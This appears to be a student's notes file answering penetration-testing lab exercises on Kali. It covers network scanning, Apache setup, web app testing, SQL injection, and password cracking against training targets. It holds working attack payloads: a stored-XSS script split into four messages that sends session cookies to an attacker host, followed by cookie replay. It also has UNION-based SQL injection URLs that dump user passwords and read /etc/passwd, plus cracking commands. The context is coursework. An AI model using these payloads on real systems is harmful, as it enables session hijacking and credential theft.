@@ -1,0 +1,312 @@
+Kali
+
+Exploitation Wk6a
+
+Q2:	Target 1 lies somewhere in 192.168.1.1 - 192.168.1.254. This time use "ip route show" and find out the device name on your machine which would be used to handle packets going to target 1. You can identify it by looking at the output, finding the line involved with the target subnet, and looking for the "dev". 
+A:	Target network device: br0
+	ip r
+
+Q:	What is your machine's IP number on the target network? 
+A:	192.168.1.254
+	ip r
+
+Q3:	Use nmap to sweep the target network, and identify the IP address of target 1. Use the appropriate flags to keep this scan efficient.
+A: 	nmap -sn 192.168.1.0/24 (-sn for host discovery)
+	192.168.1.2
+
+Q:	On the target machine, list the first 3 port numbers found in numerical order using a standard nmap portscan of the common ports open on the target.
+A:	Open port 1: 135
+	Open port 2: 139
+	Open port 3: 445
+	
+Q:	Start the postgress database
+A:	service postgresql start
+
+Q:	Start the metasploit service. 
+A:	service metasploit start
+
+Q:	Start the metasploit console. This can be a long long wait! Can sit there for 5 minutes appearing not to do anything!! The services also use a lot of CPU time initially while they are initialising. After a while response times seem to get a lot better. 
+A:	msfconsole
+
+Apache Wk8a
+
+Q1: Each time you make a configuration change to the Apache server you must restart (or at the very least reload) the http service. Remember to start apache for the first time do:
+A: service apache2 start
+   service apache2 reload
+
+Q2: Enable the userdir feature by doing
+		a2enmod userdir
+		service apache2 restart
+	To demonstrate this feature, create a user called "dave".
+		adduser dave
+		su - dave (Ctrl D logs you out of current user)
+	Create a public_html directory in dave's home directory, and create a file hello.html in the public_html. The contents of this file should be: 
+		mkdir public_html
+	 The "/home/dave" and "/home/dave/public_html" must be executable by others, and the "/home/dave/public_html/hello.html" file must be readable by other. This should be the default. However if needed you can always do this manually:
+		chmod 701 /home/dave /home/dave/public_html
+		chmod o+r /home/dave/public_html/hello.html
+	You can direct your browser to see this page by using the URL
+		http://yourmachinename/~dave/hello.html
+	Replace "yourmachinename" with the output of running the "hostname" command, eg
+		[root@host-19-17 dave]# hostname
+
+Q3:  Create the following directories, owned by dave (so su - dave first), each of which must be executable for other:
+A:  su dave
+    mkdir /home/dave/public_html/web
+    mkdir /home/dave/public_html/vm
+	
+Q4: 
+A: <VirtualHost *:80>
+    ServerAdmin me@jamie.org
+    DocumentRoot /home/dave/public_html/web/
+	ServerName web-5-97.linuxzoo.net
+   </VirtualHost>
+
+Q5: Build a user called "tom" to experiment with. Now create a user called "tom", create a public_html directory in tom's home directory, and create a file p1.html in the public_html. Make use of the "su - tom" command to keep ownership correct. The contents of this file should be:
+A: 	adduser tom
+	su tom
+	mkdir public_html
+	nano ./public_html/p1.html
+
+Q6:	Create the following directories, each of which must be executable by others: /home/tom/public_html/richard and /home/tom/public_html/harry
+	In each of these new directories create a file similar to p1.html, but called: /home/tom/public_html/richard/p2.html and /home/tom/public_html/harry/p3.html
+A:  mkdir harry, mkdir richard
+	nano ./richard/p2.html, nano ./harry/p3.html
+
+Q7: Create a password file for basic authentication. Best to be "tom" to do this properly.
+    The htpasswd command allows you to create the file, and to add users to the file. Use it to create a basic authentication password file called "/home/tom/webpasswd". Put into this file two users with the following passwords: 
+A: htpasswd -c /home/tom/webpasswd richard (-c to create the password file)
+   htpasswd /home/tom/webpasswd harry
+
+Gave up on Q8
+
+Web Application Testing Wk8B
+
+Q2: Document the details of the Kali Ethernet Interface, eth0. This interface links Kali with the outside world:
+A:	IP: 10.0.5.97
+	mac: 00:0c:61:00:05:90
+	gateway: 10.0.5.102
+	ifconfig, ip r
+
+Q: 	Target 1 lies somewhere in 192.168.1.1 - 192.168.1.254. This time use "ip route show" and find out the device name on your machine which would be used to handle packets going to target 1. 
+A: 	br0
+	ip r
+
+Q:  What is your machine's IP number on the target network? 
+A:  192.168.1.254
+	ifconfig br0
+	
+Q:  Use nmap to sweep the target network, and identify the IP address of target 1. 
+A:  Target IP: 192.168.1.1
+	nmap 192.168.1.0/24
+
+Q: Port scan the target, limiting your portscan to only the default Web TCP ports of 80 and 8080. As part of this do an application version scan. 
+A: 	Number of interested ports: 1
+	Web Server product?: Apache
+	Web Server version? Apache 2.2.8
+	nmap 192.168.1.1 -sV -p 80,8080
+
+Q:  Repeat the above experiment, but in a second window/ssh session capture the traffic being sent to perform the version identification.
+	To do this use tcpdump. Use numeric capture. Use the interface identified above as being the one which would handle the target's packets. Use ASCII mode (-A) and increase the snap limit to maximum (-s 0). To make it easier to see the traffic of interest, use a pcap filter of "dst ... and port 80" where "..." is the ip of the target. 
+A: 	What was sent by nmap to perform this check? GET / HTTP / 1.0
+	nmap 192.168.1.1 -sV -p 80,8080
+	tcpdump -A -s 0 -i br0 dst 192.168.1.1 and port 80
+
+Q:  Now manually fingerprint the target, using netcat or telnet, e.g.
+		nc TARGETIP TARGETPORT
+		HEAD / HTTP/1.0
+A:	What is the "Server" set to (Case sensitive): Apache/2.2.8 (Ubuntu) DAV/2
+	Hinted server-side application technology: PHP/5.2.4-2ubuntu5.10
+	Hinted server-side application technology:
+
+Q:	The error was due to HTTP/1.1 requiring a "Host", i.e. a virtual host name in the request. Make up a name, e.g. "unknown" and redo the query.
+	Using the virtual host field set to "unknown" redo the query and save the output to a file called "/root/vh". netcat likes to wait for a few seconds in a 1.1 version request, so you may like to introduce "-q 1", which shortens the waittime to 1 second.
+A:	nc -q 5 192.168.1.1 80 > /root/vh
+	HEAD / HTTP/1.0
+	Host: unknown
+
+Q3: nikto -host TARGETIP
+	Analyse the results of this scan.
+A:	What does nikto suggest about the Apache version? Apache should be at least 2.2.22
+
+Q: 	How many vulnerabilities has Nikto returned from the Offensive Security Vulnerability Db (OSVDB)? You must count the same vulnerability multiple times if it is listed more than once. 
+A: 	Vulnerabilities: 11
+
+Q:  Research the OSVDB-877 vulnerability. What CERT vulnerability note does this relate to? 
+A:	VU 867593
+
+Q:  Consider the information exposed by OSVDB-3233. In terms of the target, examine this file and perform a risk assessment of the contents. From this, what is the exact kernel version running here? (The entry is called "System", and is formatted "2.0.0-0-text"). 
+A:  System value: 2.6.24-16-server (open file in browser)
+
+Q4:	Even using the small list the scan may take some time. Change the output to the tree view tab. A directory "test" is found quite quickly. What directory is found in that directory?
+A: 	directory in "test": testoutput
+
+Q:	Open that directory within "test". What file can be found there? The response is space and case sensitive. 
+A:	File below test: ESAPI_logging_file_test
+
+Q5:	Using the Target tab, what is the "Host" set to in the "GET /" request.
+A:	Host in GET request: 192.168.1.1
+
+Q:	What does the site map say about the "Pragma:" part of the Response (in raw) of dvwa/login.php? This is to be found in the response headers part of the response
+A:	login.php Pragma value: no-cache
+
+Q:	What was the successful login attempt here?
+A:	username: smithy
+	password: password
+	
+Q: 	Which three parameters of the suggested list resulted in discovered pages?
+A:	page1: administrator
+	page2: secret
+	page3: admin
+	Length information suggests success in this case by: being significantly bigger than the baseline
+
+Q:  In DVWA, visit the XSS stored page. Again you should be logged in as admin. Enter a message from "jim", but in the description enter javascript.
+A:	<script>alert("watched");</script>
+
+Q:	Logout of admin, and log in with username 1337 and password charley. Again go to the XSS stored button. Now we really want to try and get "1337"'s cookie to be sent to one of our servers. But it is tricky! Ideally we want to do: Create a message from Jim, but this time make the message:
+		<script>new Image().src="http://192.168.1.254/cookie.php?"+document.cookie;</script>
+	Unfortunately the message box is only 50 characters long. So we need to split it into multiple messages...
+	Message 1:
+		<script>var h="http://192.168.1.254/";</script>
+	Message 2:
+		<script>h=h+"cookie.php";</script>
+	Message 3:
+		<script>h=h+"?"+document.cookie;</script>
+	Message 4:
+		<script>new Image().src=h;</script>
+	Now when you visit this page it will request an image from our webserver, but include the current session cookie as a GET parameter. We will use netcat to be the webserver.
+		nc -l 192.168.1.254 -p 80 > /root/xss
+
+Q:	This session cookie is only good enough until the session has ended for some reason. ends the session. To demonstrate this, and while still logged in as "admin", click on the world icon in the iceweasel address line, click more information, view cookies, and Remove All Cookies. Refresh the page and you should be back to the login page.
+	Now view your /root/xss file, and get the bit of the request which starts PHPSESSID=.... (up to the space). Now in iceweasel, go to Tools>Web Developer>Web Console. This allows you to run your own javascript... Take the PHPSESSID string and substitute it into the following instead of "abcde1234etc". This is all typed into the prompt of the console:
+		javascript:document.cookie = 'PHPSESSID=abcde1234etc; expires=3600; path=/; domain=192.168.1.1";
+
+
+sql injection wk9
+
+Q2: What is the HTTP method used to get the price of eggs? GET ("ctrl shift e" for network dev options in firefox)
+	What is the form variable name used in generating the eggs information? variable name: code
+
+Q: How many different items are stored in the database?
+	number of items: 6
+   What is the name of the item with the highest code number?
+	item name: radio
+
+Q: Number of columns that it confirms in the SQL query: Column number: 4
+A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL%20--%20
+   code=' UNION SELECT NULL, NULL, NULL, NULL --%20 (iterate with more and more NULL until achieved)
+
+Q: Combine your previous SQL injection with a "from TABLENAME", where the TABLENAME needs to be guessed. As this is all about stock and inventory, try one of the following tablename candidates:
+A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL%20from%20inventory%20--%20
+   code=' UNION SELECT NULL, NULL, NULL, NULL from inventory --%20
+   
+Q: Combine your previous SQL injection and replace one of the NULL entries with a guess as to the item codes column name. Try the following candidates: 
+A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20id,%20NULL,%20NULL,%20NULL%20from%20inventory%20--%20
+   code=' UNION SELECT id, NULL, NULL, NULL from inventory --%20
+
+Q: Combine your previous SQL injection and replace another one of the NULL entries with a guess as to the item codes column name. As this is about stock it seems plausable that the missing column is about how much stock is available. Try the following candidates: 
+A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20id,%20instock,%20NULL,%20NULL%20from%20inventory%20--%20
+   code=' UNION SELECT id, instock, NULL, NULL from inventory --%20
+   
+Q: How much milk is in stock? 
+A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20OR%201=1%20UNION%20SELECT%20id,%20instock,%20NULL,%20NULL%20OR%201=1%20from%20inventory%20--%20
+   ' OR 1=1 UNION SELECT id, instock, NULL, NULL OR 1=1 from inventory --%20
+   
+Q: Use the first attribute and find out the name of the database (i.e. the schema name) which we are using. This is a mysql function. database schema name: hack
+A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20database(),%20NULL,%20NULL,%20NULL%20--%20
+   ' UNION SELECT database(), NULL, NULL, NULL --%20
+
+Q: With the database name and your SQL injection, select the "table_name" from "information_schema.tables", restricting your query to those which have the "table_schema" set to the database name identified above. 
+A: Number of tables: 3 Likely table name of the application users: theusers
+   http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20table_name,%20NULL,%20NULL,%20NULL%20FROM%20information_schema.tables%20WHERE%20table_schema=%27hack%27%20--%20
+   code=' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema='hack' --%20
+
+Q: Using "information_schema.columns", what are the column names of the table which you suspect of being the user information table in this database schema? In your query restrict the injected query to only the correct table_schema and table_name. 
+A: Column 1: name Column 2: pwd
+   http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20table_schema,%20table_name,%20column_name,%20NULL%20FROM%20information_schema.columns%20WHERE%20table_schema=%27hack%27%20AND%20table_name=%27theusers%27--%20
+   code=' UNION SELECT table_schema, table_name, column_name, NULL FROM information_schema.columns WHERE table_schema='hack' AND table_name='theusers'--%20
+
+Q: Now extend your original SQL injection, using the name of the application user's table and the newly discovered column names to access the application's user table information. 
+A: What is the password for user "clever"? password: jupasdads
+   http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20%27%27,%20CONCAT(name,%20%27%20%27,%20pwd),%20NULL,%20NULL%20FROM%20hack.theusers--%20
+   code=' UNION SELECT '', CONCAT(name, ' ', pwd), NULL, NULL FROM hack.theusers--%20
+
+Q:  Again extending your original SQL injection, make use of the LOAD_FILE function to access /etc/passwd. The password file has the following repeating format: username:x:userid:groupid:/home:/bin/bash
+A: Using this information, what is the first username seen in /etc/passwd using this injection? username: root
+   http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20union%20select%201,load_file(%27/etc/passwd%27),3,4%20%20--%20
+   ' union select 1,load_file('/etc/passwd'),3,4 --%20
+   
+Q:	The output of the above is a little messy to read. Use the CONCAT command and concat the output of LOAD_FILE between the html strings "<pre>" and "</pre>" Repeat your experiment with this new formatting... 
+A:	http://host-5-33.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20CONCAT%20(%27%3Cpre%3E%27,%20load_file(%27/etc/passwd%27)%20,%20%27%3C/pre%3E%27),%20NULL,%20NULL,%20NULL%20--%20
+	' UNION SELECT CONCAT ('<pre>', load_file('/etc/passwd') , '</pre>'), NULL, NULL, NULL --%20
+   
+Password Attacks Wk10
+
+Q2: What is the md5 encoding of the string "password"? encoding: 
+A: echo -n password | md5sum | cut -f1 -d" " 
+   5f4dcc3b5aa765d61d8327deb882cf99
+   
+Q: How is the md5 encoded, and how many bits does this represent? 
+A: Encoding: Hex
+   bits: 128
+   
+Q: This command, ./hex.pl, takes 1 parameter. This is a hex encoded md5 password. Try running ./hex.pl with the md5 hex from the question above where you calculated the md5 of "password".
+	How many tries did it take to crack the code. tries: 3
+A: ./hex.pl 5f4dcc3b5aa765d61d8327deb882cf99
+
+Q: Extend the search to try the dictionary words in hex.pl but with the numbers 0-9 appended to them. So edit hex.pl, and replace all lines after "my tries=0" with: line add:
+A: 38 (code results in 39 due to error)
+
+Q: Extend the search to try the dictionary words in hex.pl but with the numbers 0-999 appended to them.
+A: What is the password?
+	password: tasty500
+	tries: 3011 (code results in 3012 but theres an error)
+	
+Q: Assuming that you had a small dictionary of 20 words, and looked at the permutations of the password being any one of those words, either as it is or with numbers ranging from 0 to 9999, then consider the implications of this.
+A: How many permutations would that be? permutations: 200,020
+   Which of these is most true? B,E
+   
+Q3: First locate john's password.lst file. Use the find command for this. Note the "lst" is "L S T", and not a "one". If you find more than one, choose the SHORTEST path.
+A:  locate password.lst
+	Full path of password.lst: /usr/share/john/password.lst
+
+Q: Examine the example1.sam file. What hashes does it contain?
+A: cat example1.sam
+   john example1.sam
+   
+Q: Crack with John The Ripper the example1.sam file. Use it in "wordlist" mode, and use the full path of password.lst. Use the "lm" format, as this is faster to crack... Apply "john" to example1.sam.
+A: john --wordlist example1.sam
+
+Q: Use "john --show example1.sam" and evaluate its attempt. Passwords are CASE SENSITIVE in the checks!
+A: What is the password of "gordon": OXFORD What is wrong with the password of "Administrator": Only cracked the first half of LM
+
+Q: Switch to John The Ripper in "incremental" mode, and apply it to example1.sam. Use the show mode and identify the password of Administrator. Passwords are CASE SENSITIVE in the checks!
+A:  What is the password of "administrator":  PASSWORD123
+
+Q4:  Target 1 lies somewhere in 192.168.1.1 - 192.168.1.254. This time use "ip route show" and find out the device name on your machine which would be used to handle packets going to target 1. 
+A: Target network device: br0
+
+Q: What is your machine's IP number on the target network? 
+A: Your IP: 192.168.1.254
+
+Q: Use nmap to sweep the target network, and identify the IP address of target 1. 
+A:  nmap 192.168.1.0/24
+	Target IP: 192.168.1.1
+	
+Q: Scan port 22 of the target using nmap in application fingerprinting mode. 
+A: nmap 192.168.1.1 -p 22 -sV
+   SSH Server version?: OpenSSH 4.7p1
+   
+Q: What is the password for "user"? 
+A: password: user
+
+Q:  Repeat the process, but this time crack the user account "klog". 
+A: What is the password for "klog"? password: 123456789
+
+Q: What is the password for "sys"?
+	password: batman
+How many attempts dit it take to find the password?
+	attempts: 201
+
+
+
